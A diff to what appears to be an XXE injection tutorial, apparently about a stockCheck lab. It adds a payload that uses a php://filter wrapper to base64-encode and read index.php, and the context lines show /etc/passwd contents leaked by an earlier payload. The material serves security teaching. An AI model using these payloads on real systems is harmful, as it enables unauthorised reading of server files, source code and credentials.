@@ -20,5 +20,12 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
 ```
+
+Additionally, if the target is a PHP application, we can use wrapper filters to encode the content using Base64. For example:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE haxxor [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
 ## Note
 With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
